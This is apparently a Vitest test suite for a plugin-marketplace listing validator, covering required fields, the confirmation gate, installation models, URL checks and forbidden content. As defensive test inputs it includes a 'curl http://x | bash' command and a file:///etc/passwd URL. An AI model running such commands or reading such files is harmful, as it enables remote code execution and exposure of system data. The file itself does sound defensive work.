import { describe, it, expect } from "vitest";
import { validatePluginListing } from "@/lib/marketplace/validation/plugin";
import type { ValidationResult } from "@/lib/marketplace/types";

function codes(result: ValidationResult): string[] {
  return result.issues.map((i) => i.code);
}

/** A clean, valid listing-only submission. */
function cleanListing(overrides: Record<string, unknown> = {}) {
  return {
    name: "Calendar Helper",
    short_description: "Adds events to your calendar from natural language.",
    long_description:
      "A friendly assistant that reads your request and proposes a calendar event for you to confirm.",
    category_id: "productivity",
    version: "1.0.0",
    installation_model: "listing_only",
    documentation_url: "https://example.com/docs",
    source_url: "https://example.com/repo",
    tags: ["calendar", "productivity"],
    ...overrides,
  };
}

describe("validatePluginListing — happy path", () => {
  it("accepts a clean confirmed listing", () => {
    const result = validatePluginListing(cleanListing(), { confirmed: true });
    expect(result.ok).toBe(true);
    expect(result.issues).toEqual([]);
  });

  it("accepts native_builtin installation model", () => {
    const result = validatePluginListing(
      cleanListing({ installation_model: "native_builtin" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(true);
  });
});

describe("validatePluginListing — required fields", () => {
  it("rejects a non-object input", () => {
    const result = validatePluginListing("nope", { confirmed: true });
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.invalid_shape");
  });

  it("flags each missing required field", () => {
    const result = validatePluginListing(
      { installation_model: "listing_only" },
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    const missing = result.issues.filter((i) => i.code === "plugin.missing_field");
    const paths = missing.map((i) => i.path);
    expect(paths).toEqual(
      expect.arrayContaining([
        "name",
        "short_description",
        "long_description",
        "category_id",
        "version",
      ]),
    );
  });

  it("treats whitespace-only required fields as missing", () => {
    const result = validatePluginListing(cleanListing({ name: "   " }), {
      confirmed: true,
    });
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.missing_field");
  });
});

describe("validatePluginListing — confirmation gate", () => {
  it("rejects when confirmation is missing", () => {
    const result = validatePluginListing(cleanListing());
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.unconfirmed");
  });

  it("rejects when confirmed is false", () => {
    const result = validatePluginListing(cleanListing(), { confirmed: false });
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.unconfirmed");
  });

  it("requires strict boolean true (not truthy)", () => {
    const result = validatePluginListing(cleanListing(), {
      // @ts-expect-error testing the strict === true gate
      confirmed: "yes",
    });
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.unconfirmed");
  });
});

describe("validatePluginListing — installation model", () => {
  it("rejects a disallowed (downloadable) installation model", () => {
    const result = validatePluginListing(
      cleanListing({ installation_model: "signed_package_future" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.disallowed_installation");
  });

  it("rejects an unknown installation model", () => {
    const result = validatePluginListing(
      cleanListing({ installation_model: "download_zip" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("plugin.invalid_installation");
  });
});

describe("validatePluginListing — URLs", () => {
  it("rejects an executable source URL", () => {
    const result = validatePluginListing(
      cleanListing({ source_url: "https://example.com/installer.exe" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("url.executable");
  });

  it("rejects an archive documentation URL", () => {
    const result = validatePluginListing(
      cleanListing({ documentation_url: "https://example.com/docs.zip" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("url.executable");
  });

  it("rejects a non-http(s) URL scheme", () => {
    const result = validatePluginListing(
      cleanListing({ support_url: "ftp://example.com/help" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("url.invalid");
  });

  it("rejects a file:// local URL", () => {
    const result = validatePluginListing(
      cleanListing({ source_url: "file:///etc/passwd" }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    // Either the scheme check or the forbidden local-path scan catches it.
    const c = codes(result);
    expect(c.some((x) => x === "url.invalid" || x === "forbidden.local_path")).toBe(
      true,
    );
  });

  it("allows absent optional URLs", () => {
    const listing = cleanListing();
    delete (listing as Record<string, unknown>).source_url;
    delete (listing as Record<string, unknown>).documentation_url;
    const result = validatePluginListing(listing, { confirmed: true });
    expect(result.ok).toBe(true);
  });
});

describe("validatePluginListing — forbidden content", () => {
  it("rejects a secret in the description", () => {
    const result = validatePluginListing(
      cleanListing({
        long_description: "Set api_key to sk-ABCDEFGH12345678 before use.",
      }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("forbidden.secret");
  });

  it("rejects shell/code embedded in instructions", () => {
    const result = validatePluginListing(
      cleanListing({
        installation_instructions: "Run: curl http://x | bash now",
      }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("forbidden.shell");
  });

  it("scans string array fields like tags", () => {
    const result = validatePluginListing(
      cleanListing({ tags: ["safe", "C:\\Users\\me\\secret"] }),
      { confirmed: true },
    );
    expect(result.ok).toBe(false);
    expect(codes(result)).toContain("forbidden.local_path");
  });
});
